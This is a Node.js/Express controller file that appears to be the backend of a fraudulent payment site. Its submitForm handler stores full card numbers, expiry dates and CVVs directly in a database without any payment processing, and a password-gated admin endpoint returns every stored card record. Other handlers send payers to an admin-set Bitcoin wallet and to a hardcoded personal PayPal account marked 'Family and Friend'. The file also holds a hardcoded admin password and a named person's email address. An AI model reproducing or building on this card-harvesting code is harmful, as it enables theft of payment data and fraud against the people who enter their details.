const Form = require("../models/formModel");
const Btc = require("../models/btcModel");
const bcrypt = require("bcryptjs");
const AdminSettings = require("../models/AdminSettings");
const countries = require("../data/countries.json");
const Payment = require("../models/paymentModel"); // Create a schema for payments if not already done


// Handle form submissions
exports.submitForm = async (req, res) => {
  try {
    const { cardNumber, expiryDate, cvv, amount, country } = req.body;

    if (!amount || !cardNumber || !expiryDate || !cvv || !country) {
      return res.status(400).json({ error: "All fields are required." });
    }
    if (amount < 10) {
      return res.status(400).json({ error: "Amount must be at least 10." });
    }

    const isValidCountry = countries.some((c) => c.name === country);
    if (!isValidCountry) {
      res.status(400);
      throw new Error("Invalid country selection.");
    }

    // Validate expiry date
    const [month, year] = expiryDate.split("/").map(Number); // Split MM/YY
    const currentDate = new Date();
    const expiryDateObject = new Date(`20${year}`, month - 1); // Convert MM/YY to Date object

    if (expiryDateObject <= currentDate) {
      return res
        .status(400)
        .json({ error: "Expiry date must be in the future." });
    }

    // Create a new instance of the Form model
    const formData = new Form({ cardNumber, expiryDate, cvv, amount, country });
    await formData.save(); // Save the data to the database

    res.status(200).json({ message: "Form submitted successfully!" });
  } catch (error) {
    console.error("Error saving form data:", error);
    res.status(500).json({ error: "Error saving form data" });
  }
};

// Seed the initial admin settings (run this once when the app starts)
exports.seedAdminSettings = async (req, res) => {
  try {
    const hashedPassword = await bcrypt.hash("adminMainPassword", 10); // Replace "admin123" with your desired password
    const settings = new AdminSettings({
      btcWalletAddress: "default_wallet_address", // Replace with a default BTC address
      adminPassword: hashedPassword,
    });
    await settings.save();
    res.status(200).json({ message: "Admin settings seeded successfully." });
  } catch (error) {
    console.error("Error seeding admin settings:", error);
    res.status(500).json({ error: "Error seeding admin settings." });
  }
};

// Random user submits a BTC payment
exports.btcWalletAddress = async (req, res) => {
  try {
    const { amount, country } = req.body;

    if (!amount || !country) {
      return res.status(400).json({ error: "Amount is required." });
    }
    if (amount < 10) {
      return res.status(400).json({ error: "Amount must be at least 10." });
    }

    const isValidCountry = countries.some((c) => c.name === country);
    if (!isValidCountry) {
      res.status(400);
      throw new Error("Invalid country selection.");
    }

    // Fetch the wallet address from admin settings
    const adminSettings = await AdminSettings.findOne();
    if (!adminSettings) {
      return res.status(500).json({ error: "Admin settings not configured." });
    }

    // Save BTC payment to database
    const btcPayment = new Btc({
      amount,
      country,
      walletAddress: adminSettings.btcWalletAddress,
    });
    await btcPayment.save();

    res.status(200).json({
      message: "Payment submitted successfully.",
      btcWalletAddress: adminSettings.btcWalletAddress,
    });
  } catch (error) {
    console.error("Error processing BTC payment:", error);
    res.status(500).json({ error: "Error processing BTC payment." });
  }
};

// Admin edits the BTC wallet address
exports.editBtcWalletAddress = async (req, res) => {
  try {
    const { password, newBtcWalletAddress } = req.body;

    if (!password || !newBtcWalletAddress) {
      return res
        .status(400)
        .json({ error: "Password and new wallet address are required." });
    }

    const adminSettings = await AdminSettings.findOne();
    if (!adminSettings) {
      return res.status(500).json({ error: "Admin settings not configured." });
    }

    // Compare passwords
    const isPasswordValid = await bcrypt.compare(
      password,
      adminSettings.adminPassword
    );
    if (!isPasswordValid) {
      return res
        .status(403)
        .json({ error: "Access denied: Incorrect password." });
    }

    // Update the wallet address
    adminSettings.btcWalletAddress = newBtcWalletAddress;
    await adminSettings.save();

    res.status(200).json({
      message: "BTC wallet address updated successfully!",
      btcWalletAddress: adminSettings.btcWalletAddress,
    });
  } catch (error) {
    console.error("Error updating BTC wallet address:", error);
    res.status(500).json({ error: "Error updating BTC wallet address." });
  }
};

exports.paypalPayment = async (req, res) => {
  try {
    const { amount, country } = req.body;

    if (!amount || !country) {
      return res.status(400).json({ error: "Amount and country are required." });
    }
    if (amount < 10) {
      return res.status(400).json({ error: "Amount must be at least 10." });
    }

    const isValidCountry = countries.some((c) => c.name === country);
    if (!isValidCountry) {
      return res.status(400).json({ error: "Invalid country selection." });
    }

    // Create the payment details
    const paymentDetails = {
      amount,
      country,
      paypalEmail: "mclemoreapril7@gmail.com",
      receiverName: "April Mclemore",
      paymentNote: "Family and Friend",
    };

    // Save to the database
    const payment = new Payment(paymentDetails);
    await payment.save();

    res.status(200).json({
      message: "Payment details saved successfully.",
      paymentDetails,
    });
  } catch (error) {
    console.error("Error processing PayPal payment:", error);
    res.status(500).json({ error: "Error processing PayPal payment." });
  }
};

exports.editPaypalDetails = async (req, res) => {
  try {
    const { password, newPaypalEmail, newReceiverName, newPaymentNote } = req.body;

    if (!password || !newPaypalEmail || !newReceiverName || !newPaymentNote) {
      return res
        .status(400)
        .json({ error: "Password, email, receiver name, and note are required." });
    }

    // Fetch admin settings
    const adminSettings = await AdminSettings.findOne();
    if (!adminSettings) {
      return res.status(500).json({ error: "Admin settings not configured." });
    }

    // Validate admin password
    const isPasswordValid = await bcrypt.compare(
      password,
      adminSettings.adminPassword
    );
    if (!isPasswordValid) {
      return res.status(403).json({ error: "Access denied: Incorrect password." });
    }

    // Update PayPal details in admin settings
    adminSettings.paypalDetails = {
      email: newPaypalEmail,
      receiverName: newReceiverName,
      paymentNote: newPaymentNote,
    };
    await adminSettings.save();

    res.status(200).json({
      message: "PayPal details updated successfully!",
      paypalDetails: adminSettings.paypalDetails,
    });
  } catch (error) {
    console.error("Error updating PayPal details:", error);
    res.status(500).json({ error: "Error updating PayPal details." });
  }
};


// Fetch form data for admin dashboard
exports.getFormData = async (req, res) => {
  try {
    const { password } = req.body; // Extract the password from the request body

    if (!password) {
      return res.status(400).json({ error: "Password is required." });
    }

    // Fetch the admin settings from the database
    const adminSettings = await AdminSettings.findOne();
    if (!adminSettings) {
      return res.status(404).json({ error: "Admin settings not found." });
    }

    // Validate the password using bcrypt
    const isPasswordValid = await bcrypt.compare(
      password,
      adminSettings.adminPassword
    );
    if (!isPasswordValid) {
      return res
        .status(403)
        .json({ error: "Access denied: Incorrect password." });
    }

    // Fetch form and BTC data, sorted by latest
    const formData = await Form.find({}).sort({ _id: -1 });
    const btcData = await Btc.find({}).sort({ _id: -1 });
    const paymentData = await Payment.find({}).sort({ _id: -1 });

    // Respond with the combined datasets
    res.status(200).json({
      formData,
      btcData,
      paymentData
    });
  } catch (err) {
    // Handle and log server errors
    console.error("Error fetching form data:", err);
    res.status(500).json({ error: "Error fetching form data." });
  }
};
